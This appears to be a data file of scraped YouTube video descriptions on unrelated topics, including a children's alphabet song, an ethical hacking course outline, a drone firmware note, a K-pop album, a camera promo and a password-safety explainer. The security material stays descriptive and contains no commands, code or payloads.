This Alphabet song in our Let’s Learn About the Alphabet Series is all about the consonant b \n\nYour children will be engaged in singing, listening and following along as they’ll learn to:  identify the alphabet letter, form the upper and lower case letter, say the letter sound clearly and accurately. They will see, hear and say the letter and its sound as a beginning and ending sound with a variety of storytelling words.\n\nThis letter song also includes a catchy chorus that will motivate your children to want to learn about the alphabet, and at the end, an inspirational reading rap.\nAll of the alphabet songs in this series have a great beat, lots of repetition and curriculum based reading and language arts content that meets state, national and common core standards.  All of the letters that we use and the way we form the letters follow the Zaner-Bloser Handwriting Manuscript.\nYour children will want to sing this catchy, cool, reading skill song over and over.  They will hear the consonant sound at the beginning and at the end of each word.\n\nListening to this engaging, reading, skill-building alphabet song and following all the printed words and entertaining visuals, your children will develop their phonological awareness, phonics and language arts skills.  \nThe very helpful educational feature of each song is a close-up of Jack saying each letter sound clearly.  Your children will be able to see how Jack forms his mouth to say the sound correctly.  Children can model these mouth positions so they can say the letter sounds correctly, too.  We hope your children both enjoy and learn from each one of the alphabet songs in our Let’s Learn About the Alphabet Series.  Sing and watch them over and over again.\nAnd, as an extension activity, see if you and your children can think of new words and stories for each letter.  We found searching for words for each letter to be very challenging and really a lot of fun.  \n\n\n\nLYRICS:\n\nGet ready, get set, Let’s Learn About the Alphabet  \n 26 letters, that’s it, Let’s Learn About the Alphabet\n    \nLet’s learn about the letter B\nB is a letter, b is a letter, b is a letter\nB is a letter in the alphabet\nThis is an uppercase B, write it in the air like this\nThis is an uppercase B, write it in the air like this\nThis is a lowercase b, write it in the air like this\nThis is a lowercase b, write it in the air like this\n\nGet ready, get set, Let’s Learn About the Alphabet\n\nLetter b is a consonant and it has a sound\nLetter b is a consonant and it has a sound\nI say the b sound /b/  -  /b/ /b/ /b/ /b/\nNow you say the b sound /b/  -  /b/ /b/ /b/ /b/\n\nAt the beginning of these words\nListen for the b sound /b/\nThere was a bunny, bunny, bunny\nWith a basket, basket, basket\nWho rode a bicycle, bicycle, bicycle\nTo pick some berries, berries, berries\n\nAt the end of these words\nListen for the b sound /b/\nThere was a crab, crab, crab\nWho had a job, job, job\nTo fix the tub, tub, tub\nAnd the knob, knob, knob\n\nIt’s fun to learn about the alphabet\nAnd I’m really gonna’ try and do my best\nLearn each letter, learn each sound\nLearn how to write each letter down\nI feel so good deep inside\nI’m proud I’m learning, to read and write\n\nGet ready, get set, Let’s Learn About the Alphabet  \n 26 letters, that’s it, Let’s Learn About the Alphabet\n\nJack Hartmann's website: http://www.jackhartmann.com\nRemember to connect with Jack Hartmann on his Social Networks:\nFacebook: https://www.facebook.com/hop2itmusic\nPinterest: https://www.pinterest.com/jackhartmann/\nYouTube: https://www.youtube.com/user/JackHartmann\nTwitter: https://twitter.com/Jack_Hartmann\nGoogle +: https://plus.google.com/u/0/111246828015196865180/posts\nYou can find Jack Hartmann's Music on:\nJack Hartmann Website: http://www.jackhartmann.com\niTunes: https://itunes.apple.com/us/artist/jack-hartmann/id391057562\nAmazon Mp3: http://www.amazon.com/s/ref=ntt_srch_drd_B00423GXF2?ie=UTF8\u0026field-keywords=Jack%20Hartmann\u0026index=digital-music\u0026search-type=ss\nGoogle Play: https://play.google.com/store/music/artist/Jack_Hartmann?id=Ax3xg7dhdt5nx4b47dnwxjnhhhy\u0026hl=en\nCD Baby: http://www.cdbaby.com/Artist/JackHartmann",2016-08-04,2020-12-27,,,n,

This training will establish your understanding of all the fundamental concepts, processes, and procedures.. You will spend time concentrating on each knowledge area, and studying the tools and techniques, inputs, and outputs associated with each knowledge area.In this course I covered all the topics,it’s a perfect Kali Linux tutorial for you.\n\nIn the pre-assessment quiz you’ll face questions from all sections of this Ethical Hacking training. Test your current knowledge and know your strengths and weaknesses.\n\nIn Introduction to Ethical Hacking, you will be introduced to various concepts on ethical hacking. You will receive an introduction to the basics of Risk Management and Disaster Recovery. As well as an introduction to Penetration Testing.You will gain a comprehensive understanding of vulnerability assessment and the tools used in this process. What kind of security measures do you take to protect your facilities, equipment, resources, personnel, and property from damage caused by unauthorized access? In this course, Physical Security, these are questions that we will be answering. Footprinting is the gathering of information related to a particular computer and its users and systems.\n\nReconnaissance is an exploration that is conducted to gain information. Network scanning is the scanning of public or private networks to find out which systems are running, their IP addresses, and which services they are running. In Port Scanning, you will learn how ports can be scanned, how a hacker can break into your network through the ports, and the countermeasures you can take to protect your device or network.\n\nBanner grabbing is a technique used to grab information about computer systems on a network and the services running its open ports. In this course you will be introduced to enumeration and the many different uses it has in computer systems. This course will include demos on the different tools and uses of enumeration. In this course you will be learning the fundamentals of Linux. We will be pairing this course with demos with a more in-depth look into some of the fundamentals and tools of Linux.\n\nPentesting is an attack on a system in hopes of finding security weaknesses. In the course Configuring Linux for Pentesting, you will be learning the steps to configure Linux for pentesting and tools used for pentesting on a Linux system. Whenever we login to a computer system, we provide information to identify ourselves. We refer to this as authentication. Ensure that you know everything involved in securing a Windows system against attack. During this course you’ll get into Windows passwords — how they’re created, how they’re stored, and different methods used to crack them.\n\nYou will take a good look at spyware, the activities it performs, different types of spyware, and the countermeasures needed in order to prevent hackers from utilizing these types of techniques against your company. You will also spend time studying different types of keyloggers. There are three different types of keyloggers that we see used in today’s environments: hardware, software, and kernel/driver keyloggers. Covering Tracks will be going over various ways that attackers have at their disposal to cover any tracks that may lead to their unwanted eviction, or worse yet, to an audit trail that would lead directly back to them. Trojans and Backdoors is the course where our software is going to be going undercover.\n\nYou will discover what viruses and worms are and how they can infect computers and systems. Sniffers is our course where we take a look at Network Sniffing. Social engineering is the art of extorting employees for information.\n\nBecome familiar with the following concepts: denial-of-service, distributed denial-of-service, and how the denial-of-service and distributed denial-of-service attacks take place. In the course Session Hijacking, you will learn details about session hijacking, well-known techniques employed by aggressors, the steps involved in session hijacking, various types of session hijacking, tools for hijacking sessions, ways you can protect yourselves from session hijacking, and how pentesting can be used to identify vulnerabilities. Hacking Web and Application Servers, is a course that will give you a good idea about vulnerabilities and attacks available for web servers and web applications. In our course our course Advanced Exploitation Techniques, you will learn what advanced exploitation techniques are and how you can use them in your penetration testing.",2019-02-15,2020-12-27,,,n,

This fixes the channel output error (uncontrolled servo movements) under certain conditions and strengthened correction and verification capability.\n\nThis effects all transmitters and receivers running the D16 ACCST protocol. \n\nTransmitters include: Taranis Q-X7 \u0026 Q-X7S, Taranis X9D including Plus and Special Edition, Taranis X9E, X-Lite, Horus X10 \u0026 X10S, Horus X12S, and the JR bay XJT module.\n\nReceivers include: XM, XM+, X4R, X4RSB, X6R, X8R, RXSR, RX4R, RX6R, RX8R, RX8R PRO, G-RX6, G-RX8, S6R, S8R, RXSR-FC (OMNIBUS F4 NANO V7), RXSR-FC (OMNINXT-F7), RXSR-FC (OMNIBUS F4 FIREWORKS V2), RXSR-FC (OMNIBUS F4 V6), and RXSRF3OM.\n\nFind the firmware using the links on this web page https://www.frsky-rc.com/important-firmware-update-accst-d16/\n\nThe issue with this is that I can't find any reports of problems with ACCST on places like RC Groups. I think that FrSky need to release a proper statement for what this update is for and how many people had issues. Should you update? That's down to you. Personally, I'll be waiting for further clarification, as I've had no issues with ACCST whatsoever.\n\nFor more tips and tutorials, check out https://www.MrD-RC.com and look for the group Fixed Wing RC Rebels on Facebook.

G.Soul)'를 비롯해 지난해 11월 발매해 각종 음원차트를 휩쓸었던 'BERMUDA TRIANGLE (Feat. Crush, DEAN)', 지난 4월에 발매했던 싱글 'She’s a Baby'까지 더해져 총 6곡이 수록됐다. \n\n첫 번째 트랙 '천재 (Behind the scene)'는 퓨처 기반의 힙합 장르로 '완벽주의', '타고난 천재'라는 화려한 수식어 뒤에 늘 더 나은 음악을 위해 고뇌하고 노력하는 지코의 자전적 이야기를 담아낸 곡이다. 지코의 음악 활동에 대한 하루 일과를 이야기하듯 풀어내는 래핑과 더불어 계속 흥얼거리게 되는 전 후렴구 훅(Hook)이 머릿속에 맴돈다.\n\n두 번째 트랙 'Artist'는 버라이어티한 구성이 돋보이는 곡으로 지코의 센스 있는 편곡 능력을 엿볼 수 있다. 'We are Artist'라는 가사처럼 저마다가 갖고 있는 예술가로서의 면모를 주저 없이 표현하라는 메시지를 담고 있다. 무더위에 지쳐있고 무료한 일상을 보내고 있는 이들에게 웃음을 줄 수 있는 청량한 여름 힙합곡으로 손색없다.\n\n세 번째 트랙 'ANTI (Feat. G.Soul)'는 지코 스스로가 가상의 극성 안티팬이 된 것처럼 설정해 스스로에게 악담을 쏟아내는 내용을 담은 파격적인 곡이다. 이번 앨범 'Television' 속 지코 자신에 대한 치열한 자아 성찰의 결과를 여실히 담아낸 곡이기도 하다. 트랙에는 감각적인 R\u0026B 아티스트 지소울이 피처링에 참여해 호소력 있는 보이스를 녹여냈다.\n\n네 번째 트랙 'FANXY CHILD (Feat. FANXY CHILD)'는 M.net '쇼미더머니6' 싸이퍼 곡으로 화제를 모았던 음원의 풀 버전 원곡으로, 크루 'FANXY CHILD'가 뭉쳐 만든 일렉트로닉 풍의 힙합 곡이다.\n\n다섯 번째 트랙 'She’s a Baby'는 R\u0026B 템포의 곡으로 사랑에 빠진 남자가 여성에게 느낀 감정을 솔직하게 담아낸 고백송이다. 기타와 베이스, 드럼만으로 음악 요소를 최소화하고 지코 자신의 목소리를 온전히 채워 넣었다. 힙합곡에서 듣던 지코의 묵직한 보이스와 대조적으로 솔직 담백하게 사랑을 고백하는 호소력 있는 지코의 보이스가 돋보인다.\n\n여섯 번째 트랙 'BERMUDA TRIANGLE (Feat. Crush, DEAN)'은 힙합을 기반으로 가장 지코다운 음악을 보여준 곡이다. 자신감 넘치는 자의식이 돋보이는 가사가 눈길을 끈다. 변칙적인 킥과 퍼커션의 리듬, 다양하면서도 일관된 무드의 비트 위에 특유의 비유와 개성 있는 딕션이 돋보인다. 힙합 음악의 트렌드와 음악성을 동시에 잡은 지코의 세련된 음악적 재능이 유감없이 발휘된 곡이다.     \n\n지코의 두 번째 미니앨범은 지코가 추구하는 음악적 색깔에 대한 끝없는 탐구 결과가 축적된 앨범이다. 지코는 작사, 작곡뿐 아니라 크리에이티브 디렉팅까지 도맡으며 '프로듀서'로서의 역량을 제대로 과시했다.\n\n아이튠즈, 애플뮤직 : https://itun.es/kr/cIq_kb\n스포티파이 : http://spoti.fi/2tEUruu\n\nCJ E\u0026M Music은 아시아 No.1 엔터테인먼트 기업인 CJ E\u0026M의 음악사업 브랜드로 음원/음반의 투자/제작/유통부터 콘서트/페스티벌 개최까지 포함하고 있습니다.

I fell in love with the community because (alongside the tingles, ofc), it was a space for love, acceptance, and childlike creativity.\n\nFor someone who has struggled to love themselves and feel accepted (and continues to struggle on their worse days), ASMR is such a beautiful way to get out of our negative self talk.

Sporting a retro and stylish design, the compact X-A7 weighs 320g and offers a host of features including the newly-developed 24.24MP APS-C sensor. The sensor uses copper wiring to enable high-speed data readout, and features phase detection pixels across the entire sensor surface to enhance AF speed and accuracy. This enables AF tracking of a moving subject as well as Face/Eye detection with ease. Adding to these features, X-A7 boasts a smooth recording of 4K/30fps video and high-speed video, making it a perfect camera for vloggers who want to step-up their photography from smartphone pictures. The camera offers a broad range of features from casual snapshots of everyday scenes to travel photography and full-fledged photographic creations. The X-A7 includes features beyond a smartphone’s reach by offering 3.5-inch LCD monitor with a maximum luminous intensity of approx. 1,000 candelas to guarantee intuitive operability on the rear panel. Furthermore, this is the first X Series model that features a “vari-angle” monitor and allows users to adjust it any angle. It can be used in conjunction with the Portrait Enhancer Mode for self-portraits of advanced quality. \n\nFor Advertising queries, please give us a missed call on +917827000333 Or mail us at mobiletak@aajtak.com कृपया इस लिंक पर क्लिक करें और TAK ऐप डाउनलोड करें https://bit.ly/33A6Scr\n\n\nFollow us on:\n\nFacebook: https://www.facebook.com/techtakofficial\nTwitter: https://twitter.com/techtakofficial\nInstagram: https://www.instagram.com/techtakofficial/",2019-11-13,2020-12-27,,,n,

This might feel a bit unconvincing, but it’s true there is a chance. Even mine existed publicly on the Internet without even me knowing it until recently when I finally found out that my credentials are already stolen and available for literally anyone to see. I had to then change my passwords on all my websites immediately.\n\nFun fact : There is a breach compilation available on the Internet that contains literally 1.4 billion email password combinations! Think about it! 1.4 billion!\n\nThe best way to stay safe from data breaches is to use a different password for every website. Use a password manager like Dashlane to generate random unique passwords for every website you use.\nDownload Dashlane : https://dashlane.com/techraj\n\n\nSocial Engineering\nThis is literally, you giving away your username and password to a stranger on the Internet. Hackers can pretend to be someone else to try to extract your critical information like your credentials directly from you. \nFor example, let’s say you get a link like this from someone , and this link claims that you can get Instagram likes instantly for free of cost. You click on the link, and you’re taken to a very convincing website that claims to offer you free likes for your Instagram posts. If you put your Instagram credentials right there thinking that this is a legit website, well, you’re hacked! This is called Phishing, it is one of the several types of social engineering.\n\nA hacker can also install a RAT on your device through social engineering. A RAT is nothing but a malware that gives the hacker remote access to your device. By installing a RAT, the hacker will be able to do literally anything like, stealing your credentials for different websites with a key logger, stealing your photos and videos, finding your exact GPS location, or even operate your device’s camera or microphone without your knowledge. \n\nMy YouTube channel almost got hacked by social engineering : https://youtu.be/FTxHMlZaniw\n\nMan in the Middle attacks\nNow, this type of hacking is not very likely to occur, but there is chance that you get hacked by Man in the Middle attacks. In this attack, a hacker can put himself as the Man in the Middle between you and the Internet. \nLet’s say you’re browsing Internet from a public Wifi network. Anyone who is using the same wifi network will be able to put themselves as the Man in the Middle, and they can see your Internet traffic, and even modify it. \nThis means, they will be able to see everything that you are sending and receiving from the Internet using the Public WiFi. \nBut, as I said, it is very unlikely to happen. Because most websites nowadays use HTTPS connection which means the traffic between you and the website is encrypted, and no Man In the Middle will be able to extract this internet traffic. But you’re still at risk if you’re using a website that doesn’t use HTTPS over HTTP. In such a case, you may want to use a VPN to stay secure while browsing. You can watch the video I made about VPN to know more about why it’s a good idea to always use a VPN , I will make sure to leave the link in the description.\n\nWatch the video I made about VPN : https://youtu.be/veWBxBar-l0\n\nSupport on Patreon : https://patreon.com/techraj156\n\nFollow me on Instagram : https://instagram.com/teja.techraj \nLike my Facebook Page : https://fb.com/techraj156 \nWebsite : https://techraj156.com \nBlog : https://blog.techraj156.com \n\nThanks for watching! \nSUBSCRIBE for more videos!",2020-04-01,2020-12-27,,,n,

A smart mirror displays applications so that you can check the weather, local news, etc. while you are getting ready in the morning. It's also modular, so you can easy move it around or hang it on the wall if you like.  We've created a basic application that you can run on the smart mirror, but it's totally customizable if you want to write some of your own code. We use a Raspberry Pi 3 in this video, but you can also use an A, B+ or any other Pi.\n\nCheck our hackaday.io page for a full parts list: https://hackaday.io/project/13466-raspberry-pi-smart-mirror\n\nGet the 3D printable part files for this project on our Patreon: https://www.patreon.com/posts/smart-mirror-37732540\n\nLINKS:\nGithub project: https://github.com/HackerShackOfficial/Smart-Mirror\n\nTo Subscribe: https://www.youtube.com/channel/UCEcNXmr7DYq1XxpWHSxaN0w?sub_confirmation=1\n\nGet our 3D printer: http://robo3d.myshopify.com?rfsn=1004615.c5abe\n\nMATERIALS:\n1 x Raspberry Pi 3\nAmazon Affiliate Link - https://goo.gl/oVJcxK\n\n1 x Low profile monitor (we used an old led display) \nAmazon Affiliate Link - https://goo.gl/a4HeP5\n\n12 ft - 1x2\n\n12 ft - 1x3\n\n1 x Wood glue\n\n1 x Low profile HDMI cable \nAmazon Affiliate Link - https://goo.gl/BzBTT8\n\n1 x 18\",2016-09-05,2020-12-27,,,n,

There is plenty on data on sound reduction out there. \n\nThe good:\n- no noticeable bolt speed increase, particularly with the vented end cap. \n- compatible with Dear Air Keymo and Silencer ASR mounts\n- no blow back \n- very good flash reduction.\n\nThe bad:\n- heavy but comparable to other 7.62 cans\n- Expensive - $1500+ MSRP... $1379.00 street price https://www.silencershop.com/cgs-helios.html + tax stamp and whatever device you want to buy that is not QD\n\nI would love to see some type of a proprietary tapered mount.",2020-11-05,2020-12-27,,,n,
